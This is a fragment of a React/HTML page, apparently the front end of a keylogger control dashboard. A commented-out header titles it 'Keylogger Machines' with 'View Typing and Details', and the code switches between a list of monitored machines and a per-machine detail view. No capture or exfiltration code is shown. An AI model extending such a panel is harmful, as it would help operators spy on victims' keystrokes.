                {/* Header */}
                {/*<header className="dashboard-header d-flex justify-content-between align-items-center mb-4">
                    <div>
                        <h1 className="h3 mb-0">
                            {currentView === 'machines' ? 'Keylogger Machines' : 'Machine Details'}
                        </h1>
                        <p className="text-body-secondary mb-0">
                            {currentView === 'machines' ? 'Machine Management and Monitoring' : 'View Typing and Details'}
                        </p>
                    </div>
                    <div>
                        <span className="badge text-bg-success">● Live</span>
                    </div>
                </header> */}

                {/* Dynamic content */}
                {currentView === 'machines' && (
                    <MachinesListView onMachineSelect={showMachineDetail}/>
                )}
                {currentView === 'machine-detail' && selectedMachineId && (
                    <MachineDetailView
                        machineId={selectedMachineId}
                        onBack={showMachinesList}
                    />
                )}
            </div>
        );
    }

    ReactDOM.createRoot(document.getElementById("root")).render(<App/>);
</script>
</body>
</html>
